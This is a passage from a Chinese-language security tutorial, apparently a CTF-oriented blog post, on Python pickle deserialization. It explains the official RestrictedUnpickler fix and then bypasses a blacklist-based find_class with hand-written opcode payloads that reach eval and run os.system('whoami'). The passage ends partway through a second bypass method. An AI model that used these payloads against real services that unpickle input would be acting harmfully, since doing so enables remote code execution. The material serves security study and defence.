key&quot;</code>，是以<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;</code>形式存储的。最后再通过字节码b来执行<code>__dict__.update()</code>，即<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;.update(&#123;&#39;secret&#39;:&#39;Hack!!!&#39;&#125;)</code>，因此最终secret变量的值被覆盖成了<code>Hack!!!</code>。</p><h2 id="官方对此漏洞的修复"><a href="#官方对此漏洞的修复" class="headerlink" title="官方对此漏洞的修复"></a>官方对此漏洞的修复</h2><p>对于pickle反序列化漏洞，官方的第一个建议就是永远不要unpickle来自于不受信任的或者未经验证的来源的数据。第二个就是通过重写<code>Unpickler.find_class()</code>来限制全局变量，我们来看官方的例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#重写了find_class方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span></span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">_pickle.UnpicklingError: <span class="keyword">global</span> <span class="string">&#x27;os.system&#x27;</span> <span class="keyword">is</span> forbidden</span><br></pre></td></tr></table></figure><p>以上例子通过重写<code>Unpickler.find_class()</code>方法，限制调用模块只能为<code>builtins</code>，且函数必须在白名单内，否则抛出异常。这种方式限制了调用的模块函数都在白名单之内，这就保证了Python在<code>unpickle</code>时的安全性。</p><p>不过，假如<code>Unpickler.find_class()</code>中对于模块和函数的限制不是那么严格的话，我们仍然有可能绕过其限制。</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="绕过find-class"><a href="#绕过find-class" class="headerlink" title="绕过find_class"></a>绕过find_class</h3><p>想要绕过<code>find_class</code>，我们则需要了解其何时被调用。在官方文档中描述如下</p><blockquote><p><em>出于这样的理由，你可能会希望通过定制</em> <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> <em>来控制要解封的对象。 与其名称所提示的不同，<a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.Unpickler.find_class"><code>Unpickler.find_class()</code></a> 会在执行对任何全局对象（例如一个类或一个函数）的请求时被调用。 因此可以完全禁止全局对象或是将它们限制在一个安全的子集中。</em></p></blockquote><p>在opcode中，<code>c</code>、<code>i</code>、<code>\x93</code>这三个字节码与全局对象有关，当出现这三个字节码时会调用<code>find_class</code>，当我们使用这三个字节码时不违反其限制即可。</p><h4 id="绕过builtins"><a href="#绕过builtins" class="headerlink" title="绕过builtins"></a>绕过builtins</h4><p>在一些例子中，我们常常会见到<code>module==&quot;builtins&quot;</code>这一限制，比如官方文档中的例子，只允许我们导入<code>builtins</code>这一模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br></pre></td></tr></table></figure><p>那么什么是<code>builtins</code>模块呢？</p><p>当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用</p><p>这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。</p><p>我们可以通过<code>for i in sys.modules[&#39;builtins&#39;].__dict__:print(i)</code>来查看该模块中包含的所有模块函数等，大致如下</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5987cec8.png" alt="image-20240320224132308"></p><p>可以看到有不少命令执行函数，可以直接使用</p><p>假如内置函数中一些执行命令的函数也被禁用了，而我们仍想命令执行，那么漏洞的利用思路就类似于Python中的沙箱逃逸。</p><p>我们来看下面一个例子，这是code-breaking 2018 picklecode中的一个例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>代码使用了<code>Unpickler.find_class()</code>限制了使用的模块只能为<code>builtins</code>，并且禁用了内置的危险函数，这时我们应该怎么利用呢</p><h5 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h5><p>我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用<code>getattr()</code>函数，<code>getattr</code>可以获取对象的属性值。因此我们可以通过<code>builtins.getattr(builtins,&#39;eval&#39;)</code>的形式来获取eval函数</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597de84e.png" alt="image-20240320224500164"></p><p>接下来我们得构造出一个<code>builtins</code>模块来传给<code>getattr</code>的第一个参数，我们可以使用<code>builtins.globals()</code>函数获取builtins模块包含的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(builtins.<span class="built_in">globals</span>())</span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;builtins&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;&#125;</span></span><br></pre></td></tr></table></figure><p>从中我们可以看出builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数</p><p>由此最终构造的payload为<code>builtins.getattr(builtins.getattr(builtins.dict,&#39;get&#39;)(builtins.golbals(),&#39;builtins&#39;),&#39;eval&#39;)(command)</code></p><p>思路有了，下面就是手写opcode了。首先获取get函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;builtins getattr&#x27;</span></span><br><span class="line">   <span class="number">18</span>: (    MARK</span><br><span class="line">   <span class="number">19</span>: c        GLOBAL     <span class="string">&#x27;builtins dict&#x27;</span></span><br><span class="line">   <span class="number">34</span>: S        STRING     <span class="string">&#x27;get&#x27;</span></span><br><span class="line">   <span class="number">41</span>: t        TUPLE      (MARK at <span class="number">18</span>)</span><br><span class="line">   <span class="number">42</span>: R    REDUCE</span><br><span class="line">   <span class="number">43</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br><span class="line">&lt;method <span class="string">&#x27;get&#x27;</span> of <span class="string">&#x27;dict&#x27;</span> objects&gt;</span><br></pre></td></tr></table></figure><p>然后获取globals()字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode2=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)R.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">pickletools.dis(opcode2)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode2))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;builtins globals&#x27;</span></span><br><span class="line">   <span class="number">18</span>: )    EMPTY_TUPLE</span><br><span class="line">   <span class="number">19</span>: R    REDUCE</span><br><span class="line">   <span class="number">20</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x000001EF06A308B0</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;pickle&#x27;</span>: &lt;module <span class="string">&#x27;pickle&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickle.py&#x27;</span>&gt;, <span class="string">&#x27;pickletools&#x27;</span>: &lt;module <span class="string">&#x27;pickletools&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickletools.py&#x27;</span>&gt;, <span class="string">&#x27;opcode1&#x27;</span>: <span class="string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntR.\n&quot;</span>, <span class="string">&#x27;opcode2&#x27;</span>: <span class="string">b&#x27;cbuiltins\nglobals\n)R.\n&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode3=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#以上opcode相当于执行了builtins.getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;)</span></span><br><span class="line"> </span><br><span class="line">pickletools.dis(opcode3)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode3))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;builtins getattr&#x27;</span></span><br><span class="line">   <span class="number">18</span>: (    MARK</span><br><span class="line">   <span class="number">19</span>: c        GLOBAL     <span class="string">&#x27;builtins dict&#x27;</span></span><br><span class="line">   <span class="number">34</span>: S        STRING     <span class="string">&#x27;get&#x27;</span></span><br><span class="line">   <span class="number">41</span>: t        TUPLE      (MARK at <span class="number">18</span>)</span><br><span class="line">   <span class="number">42</span>: R    REDUCE</span><br><span class="line">   <span class="number">43</span>: (    MARK</span><br><span class="line">   <span class="number">44</span>: c        GLOBAL     <span class="string">&#x27;builtins globals&#x27;</span></span><br><span class="line">   <span class="number">62</span>: (        MARK</span><br><span class="line">   <span class="number">63</span>: t            TUPLE      (MARK at <span class="number">62</span>)</span><br><span class="line">   <span class="number">64</span>: R        REDUCE</span><br><span class="line">   <span class="number">65</span>: S        STRING     <span class="string">&#x27;builtins&#x27;</span></span><br><span class="line">   <span class="number">77</span>: t        TUPLE      (MARK at <span class="number">43</span>)</span><br><span class="line">   <span class="number">78</span>: R    REDUCE</span><br><span class="line">   <span class="number">79</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>最后我们再调用获取到的builtins的eval函数即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tRS&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"> <span class="comment">#&lt;built-in function eval&gt;</span></span><br></pre></td></tr></table></figure><p>最终 我们构造命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">)RS&#x27;__builtins__&#x27;</span></span><br><span class="line"><span class="string">tRS&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，以上payload只是一种方法，Python沙箱逃逸的方法还有很多，但思想都大同小异。当我们在在绕过<code>find_class</code>时，我们最好先构造出沙箱逃逸的payload，然后再根据payload构造opcode即可。</p><p>当然，如果不想手写opcode的话，也可以使用pker工具来辅助生成opcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload.py</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#获取getattr函数</span></span><br><span class="line"><span class="built_in">getattr</span> = GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="comment">#获取字典的get方法</span></span><br><span class="line">get = <span class="built_in">getattr</span>(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>), <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="comment">#获取globals方法</span></span><br><span class="line">golbals=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>)</span><br><span class="line"><span class="comment">#获取字典</span></span><br><span class="line">builtins_dict=golbals()</span><br><span class="line"><span class="comment">#获取builtins模块</span></span><br><span class="line">__builtins__ = get(builtins_dict, <span class="string">&#x27;__builtins__&#x27;</span>)</span><br><span class="line"><span class="comment">#获取eval函数</span></span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(__builtins__,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 pker.py &lt; pker_test.py</span><br><span class="line"><span class="string">b&quot;cbuiltins\ngetattr\np0\n0g0\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntRp1\n0cbuiltins\nglobals\np2\n0g2\n(tRp3\n0g1\n(g3\nS&#x27;__builtins__&#x27;\ntRp4\n0g0\n(g4\nS&#x27;eval&#x27;\ntRp5\n0g5\n(S&#x27;__import__(\\&#x27;os\\&#x27;).system(\\&#x27;whoami\\&#x27;)&#x27;\ntR.&quot;</span></span><br></pre></td></tr></table></figure><h5 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h5><p>在法1中，我们通过<code>getattr(builtins,&#39;eval&#39;)</code>来获取到了内置函数<code>eval()</code>，getattr的第一个参数——builtins模块，是通过获取<code>globals()</code>中的全局变量得到的。也就是说，<code>globals()</code>函数中含有Python中提前设置好的全局变量，包括我们import的各种模块，那么我们是否可以通过<code>globals(</code>)函数来获取pickle模块呢？我们实验一下便知</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(builtins.<span class="built_in">globals</span>())</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&#123;..., <span class="string">&#x27;pickle&#x27;</span>: &lt;module <span class="string">&#x27;pickle&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\...\\Python\\Python38\\lib\\pickle.py&#x27;</span>&gt;, <span class="string">&#x27;secret&#x27;</span>: &lt;module <span class="string">&#x27;secret&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;C:\\...\\Pickle_Learning\\secret.py&#x27;</span>&gt;, <span class="string">&#x27;builtins&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>globals()</code>函数中的全局变量，确实包含我们导入的官方或自定义的模块，那么我们就可以尝试导入使用<code>pickle.loads()</code>来绕过<code>find_class()</code>了。</p><p>不过值得注意的是，由于<code>pickle.loads()</code>的参数需要为<code>byte</code>类型。而在<code>Protocol 0</code>中，对于byte类型并没有很好的支持，需要额外导入encode()函数，可能会导致无法绕过<code>find_class</code>限制。</p><p>Protocol 0:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">b=<span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">   <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;_codecs encode&#x27;</span></span><br><span class="line">   <span class="number">16</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: (    MARK</span><br><span class="line">   <span class="number">20</span>: V        UNICODE    <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line">   <span class="number">28</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">31</span>: V        UNICODE    <span class="string">&#x27;latin1&#x27;</span></span><br><span class="line">   <span class="number">39</span>: p        PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">42</span>: t        TUPLE      (MARK at <span class="number">19</span>)</span><br><span class="line">   <span class="number">43</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">46</span>: R    REDUCE</span><br><span class="line">   <span class="number">47</span>: p    PUT        <span class="number">4</span></span><br><span class="line">   <span class="number">50</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>直到<code>Protocol 3</code>版本，Python才引入了<code>B</code>和<code>C</code>两个字节码来标识byte类型</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"> </span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">b=<span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">0</span>)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: C    SHORT_BINBYTES <span class="string">b&#x27;abcdef&#x27;</span></span><br><span class="line">   <span class="number">10</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">12</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>可以看到此时pickle对于<code>byte</code>类型变量的支持精简了很多。所以当我们想利用<code>pickle.loads()</code>来绕过find_class时，最好选择<code>Protocol 3</code>版本的opcode构造。</p><p>构造<code>Protocol 3</code>版本的Payload:</p><p>首先获取get函数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Op</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">getattr</span>,(builtins.<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>,))</span><br><span class="line"> </span><br><span class="line">op=Op()</span><br><span class="line">opcode=pickle.dumps(op,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span 